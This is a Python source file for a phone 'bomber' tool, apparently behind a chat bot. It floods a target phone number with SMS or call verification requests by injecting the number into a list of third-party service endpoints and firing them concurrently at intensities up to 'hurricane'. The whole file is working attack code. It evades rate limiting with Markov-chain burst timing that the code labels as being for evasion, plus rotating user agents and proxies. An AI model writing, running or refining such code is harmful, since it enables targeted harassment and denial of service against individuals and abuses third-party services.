import asyncio
import random
import json
import time
import logging
import aiohttp
import os
import sys
from aiohttp_socks import ProxyConnector
from proxy_manager import ProxyManager

logger = logging.getLogger(__name__)


class MarkovRequestPattern:
    """Markov chain-based request timing for evasion"""

    def __init__(self):
        self.state = 0  # States: 0=normal, 1=burst, 2=cooldown
        self.transitions = {
            0: [(0, 0.6), (1, 0.4)],  # Higher chance of burst
            1: [(1, 0.5), (2, 0.5)],  # Longer burst periods
            2: [(2, 0.4), (0, 0.6)]  # Faster recovery
        }

    def next_delay(self, base_delay):
        self.state = random.choices(
            [s for s, _ in self.transitions[self.state]],
            [p for _, p in self.transitions[self.state]]
        )[0]

        if self.state == 0:  # Normal
            return random.uniform(base_delay * 0.8, base_delay * 1.2)
        elif self.state == 1:  # Burst
            return random.uniform(0, base_delay * 0.2)  # Faster during burst
        else:  # Cooldown
            return random.uniform(base_delay * 1.5, base_delay * 3)


class HighVelocityBomber:
    def __init__(self, phone, bomb_type, intensity, chat_id, proxy_manager=None):
        self.phone = phone.replace('+7', '')
        self.bomb_type = bomb_type
        self.intensity = intensity
        self.chat_id = chat_id
        self.status_msg_id = None
        self.success = 0
        self.failed = 0
        self.active = True
        self.pattern = MarkovRequestPattern()
        self.providers = []
        self.current_index = 0
        self.last_request_time = time.time()
        self.speed = 0  # Requests per second
        self.request_count = 0  # Total request count
        self.proxy_manager = proxy_manager or ProxyManager()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
        ]

        # Load providers
        self.load_providers()

        # Set parameters based on intensity
        self.delay = self.get_delay()
        self.duration = self.get_duration()
        self.concurrency = self.get_concurrency()

    def get_delay(self):
        """Get delay based on intensity"""
        delays = {
            "hurricane": 0.01,
            "high": 0.03,
            "low": 0.1
        }
        return delays.get(self.intensity, 0.05)

    def get_duration(self):
        """Get duration based on intensity"""
        durations = {
            "hurricane": 600,  # 10 minutes
            "high": 900,  # 15 minutes
            "low": 1800  # 30 minutes
        }
        return durations.get(self.intensity, 900)

    def get_concurrency(self):
        """Get concurrency level based on intensity"""
        concurrency = {
            "hurricane": 20,
            "high": 12,
            "low": 5
        }
        return concurrency.get(self.intensity, 8)

    def load_providers(self):
        try:
            base_path = os.path.dirname(os.path.abspath(__file__))
            providers_path = os.path.join(base_path, 'providers.json')

            with open(providers_path, 'r') as f:
                data = json.load(f)
                self.providers = data[self.bomb_type]
                # Randomize order and duplicate if needed for longer attacks
                random.shuffle(self.providers)
                if len(self.providers) < 50:
                    self.providers = self.providers * (50 // len(self.providers) + 1)
        except Exception as e:
            logger.error(f"Error loading providers: {e}")
            self.providers = []

    def get_next_provider(self):
        if not self.providers:
            return None
        self.current_index = (self.current_index + 1) % len(self.providers)
        return self.providers[self.current_index]

    def format_request(self, provider):
        """Inject phone number into request parameters"""
        if not provider:
            return None

        config = provider.copy()
        for key in ['url', 'data', 'json', 'params']:
            if key in config:
                if isinstance(config[key], str):
                    config[key] = config[key].replace('{phone}', self.phone)
                elif isinstance(config[key], dict):
                    for k, v in config[key].items():
                        if isinstance(v, str):
                            config[key][k] = v.replace('{phone}', self.phone)
        return config

    async def execute_request(self, session, provider):
        """Execute a single bombing request"""
        if not provider:
            return False

        config = self.format_request(provider)
        if not config:
            return False

        method = config.get('method', 'post').lower()

        # Use random user agent
        headers = config.get('headers', {})
        headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })

        try:
            timeout = aiohttp.ClientTimeout(total=8)
            if method == 'get':
                async with session.get(config['url'],
                                       params=config.get('params'),
                                       headers=headers,
                                       timeout=timeout) as response:
                    return response.status == 200
            else:
                kwargs = {}
                if 'json' in config:
                    kwargs['json'] = config['json']
                elif 'data' in config:
                    kwargs['data'] = config['data']

                async with session.request(method,
                                           config['url'],
                                           headers=headers,
                                           **kwargs,
                                           timeout=timeout) as response:
                    return response.status in (200, 201, 202, 204)
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return False

    async def start_attack(self):
        """Main bombing coroutine with concurrency"""
        if not self.providers:
            logger.error("No providers loaded, cannot start attack")
            return

        start_time = time.time()

        # Use proxy manager for rotation
        async with aiohttp.ClientSession() as session:
            tasks = set()

            # Create initial tasks
            for _ in range(self.concurrency):
                if not self.active:
                    break
                tasks.add(asyncio.create_task(self.bomb_request(session)))

            while self.active and (time.time() - start_time) < self.duration:
                done, tasks = await asyncio.wait(
                    tasks,
                    timeout=0.1,
                    return_when=asyncio.FIRST_COMPLETED
                )

                # Update speed calculation
                current_time = time.time()
                time_diff = current_time - self.last_request_time
                if time_diff > 0:
                    self.speed = 1 / time_diff
                self.last_request_time = current_time

                # Add new tasks to maintain concurrency
                while len(tasks) < self.concurrency and self.active:
                    tasks.add(asyncio.create_task(self.bomb_request(session)))

                # Small delay to prevent 100% CPU usage
                await asyncio.sleep(0.001)

            # Cancel any remaining tasks
            for task in tasks:
                task.cancel()

    async def bomb_request(self, session):
        """Execute a bomb request with timing"""
        if not self.active:
            return

        provider = self.get_next_provider()
        if not provider:
            return

        delay = self.pattern.next_delay(self.delay)
        await asyncio.sleep(delay)

        # Use proxy for this request
        try:
            connector = await self.proxy_manager.get_connector()
            if connector:
                async with aiohttp.ClientSession(connector=connector) as proxy_session:
                    success = await self.execute_request(proxy_session, provider)
            else:
                success = await self.execute_request(session, provider)
        except Exception as e:
            logger.error(f"Proxy error: {e}")
            success = False

        if success:
            self.success += 1
        else:
            self.failed += 1
        self.request_count += 1

    def stop(self):
        self.active = False